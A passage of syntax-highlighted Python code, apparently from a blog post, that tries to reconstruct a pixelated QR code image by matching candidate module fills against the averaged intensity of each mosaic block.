class=&#34;line&#34;&gt;171&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;172&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;173&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;174&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;175&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;176&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;177&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;178&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;179&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;180&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;181&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;182&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;183&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;184&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;185&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; PIL &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; Image&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; math&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; numpy &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; np&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# import scipy&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; matplotlib.pyplot &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; plt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SIZE = &lt;span class=&#34;number&#34;&gt;627&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MSBLOCK = &lt;span class=&#34;number&#34;&gt;23&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;QRBLOCK = &lt;span class=&#34;number&#34;&gt;11&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;X, Y = &lt;span class=&#34;number&#34;&gt;103&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;137&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;ImageToMatrix&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;filename&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# 读取图片&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    im = Image.&lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(filename)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# 显示图片&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#     im.show()  &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    width,height = im.size&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    im = im.convert(&lt;span class=&#34;string&#34;&gt;&amp;quot;L&amp;quot;&lt;/span&gt;) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    data = im.getdata()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    data = np.matrix(data,dtype=&lt;span class=&#34;string&#34;&gt;&amp;#x27;float&amp;#x27;&lt;/span&gt;)/&lt;span class=&#34;number&#34;&gt;255.0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    new_data = np.reshape(data,(width,height))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; new_data&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#     new_im = Image.fromarray(new_data)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#     # 显示图片&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#     new_im.show()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;MatrixToImage&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;data&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    data = data*&lt;span class=&#34;number&#34;&gt;255&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    new_im = Image.fromarray(data.astype(np.uint8))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; new_im&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pre_arr =  [[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; col &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(SIZE)] &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; row &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(SIZE)]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;res_arr =  [[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; col &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(SIZE//QRBLOCK)] &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; row &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(SIZE//QRBLOCK)]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;kimeta =  [[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; col &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(SIZE//QRBLOCK)] &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; row &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(SIZE//QRBLOCK)]&lt;span class=&#34;comment&#34;&gt;#钦定了&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EACH = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(math.ceil(MSBLOCK/QRBLOCK)) &lt;span class=&#34;comment&#34;&gt;#EACH=3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;filename = &lt;span class=&#34;string&#34;&gt;&amp;#x27;pixelated_qrcode.bmp&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;data = ImageToMatrix(filename)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;np.set_printoptions(threshold=&lt;span class=&#34;number&#34;&gt;1145141919810&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,SIZE):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,SIZE):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            pre_arr[i][j]=data[i].tolist()[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;][j]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; i%QRBLOCK==&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; j%QRBLOCK==&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                res_arr[i//QRBLOCK][j//QRBLOCK]=&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(data.tolist()[i][j])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# print(pre_arr)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt;  &lt;span class=&#34;title function_&#34;&gt;check&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;i,j,now&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; i&amp;lt;=&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; i&amp;gt;=&lt;span class=&#34;number&#34;&gt;51&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; j&amp;lt;=&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; j&amp;gt;=&lt;span class=&#34;number&#34;&gt;54&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; (pre_arr[i*QRBLOCK+&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;][j*QRBLOCK+&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;] == now):&lt;span class=&#34;comment&#34;&gt;#随便写的offset&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (kimeta[i][j] &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; vis[i][j]) &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; res_arr[i][j]!=now:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;getRange&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;i,j&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; i*QRBLOCK,j*QRBLOCK,(i+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)*QRBLOCK-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,(j+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)*QRBLOCK-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;#x1,y1,x2,y2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vis =  [[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; col &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(SIZE//QRBLOCK)] &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; row &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(SIZE//QRBLOCK)]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;calcDelta&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;Mi,Mj,fillN,comp,LUR,LUC&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    fn = fillN&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; xx &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(LUR,LUR+EACH) :&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; yy &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(LUC,LUC+EACH):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; check(xx,yy,fn&amp;amp;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;114514&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            fn = fn&amp;gt;&amp;gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    avr = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    qx1,qy1,qx2,qy2 = X+Mi*MSBLOCK,Y+Mj*MSBLOCK,X+(Mi+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)*MSBLOCK-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,Y+(Mj+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)*MSBLOCK-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(LUR,LUR+EACH) :&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; y &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(LUC,LUC+EACH):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (fillN&amp;amp;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                x1,y1,x2,y2 = getRange(x,y)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                inx1,iny1,inx2,iny2 = &lt;span class=&#34;built_in&#34;&gt;max&lt;/span&gt;(x1,qx1),&lt;span class=&#34;built_in&#34;&gt;max&lt;/span&gt;(y1,qy1),&lt;span class=&#34;built_in&#34;&gt;min&lt;/span&gt;(x2,qx2),&lt;span class=&#34;built_in&#34;&gt;min&lt;/span&gt;(y2,qy2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                avr = avr + (iny2-iny1+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)*(inx2-inx1+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            fillN = fillN &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    newres = avr/(MSBLOCK*MSBLOCK)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (newres &amp;lt; comp-&lt;span class=&#34;number&#34;&gt;0.1&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1919810&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;abs&lt;/span&gt;(math.floor((avr/(MSBLOCK*MSBLOCK))*&lt;span class=&#34;number&#34;&gt;255&lt;/span&gt;)/&lt;span class=&#34;number&#34;&gt;255&lt;/span&gt;-comp)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;putRec&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;i,j&lt;/span&gt;):&lt;span class=&#34;comment&#34;&gt;#放置识别码块&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    kimeta[i][j]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    res_arr[i][j]=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    kimeta[i][j+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    res_arr[i][j+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    kimeta[i][j-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    res_arr[i][j-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    kimeta[i+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;][j]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    res_arr[i+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;][j]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    kimeta[i-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;][j]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    res_arr[i-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;][j]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    kimeta[i+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;][j+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    res_arr[i+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;][j+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    kimeta[i-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;][j-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    res_arr[i-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;][j-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    kimeta[i+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;][j-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    res_arr[i+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;][j-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    kimeta[i-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;][j+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    res_arr[i-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;][j+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(i-&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,i+&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; y &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(j-&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,j+&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;abs&lt;/span&gt;(x-i)==&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;abs&lt;/span&gt;(y-j)==&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                kimeta[x][y]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                res_arr[x][y]=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;putRec(&lt;span class=&#34;number&#34;&gt;28&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;28&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;putRec(&lt;span class=&#34;number&#34;&gt;28&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;50&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;putRec(&lt;span class=&#34;number&#34;&gt;50&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;50&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;putRec(&lt;span class=&#34;number&#34;&gt;50&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;28&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;52&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;55&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; i==&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; i==&lt;span class=&#34;number&#34;&gt;51&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; j==&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; j==&lt;span class=&#34;number&#34;&gt;54&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            kimeta[i][j]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            res_arr[i][j]=pre_arr[i*QRBLOCK+&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;][j*QRBLOCK+&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;new_arr =  [[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; col &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(SIZE)] &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; row &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span 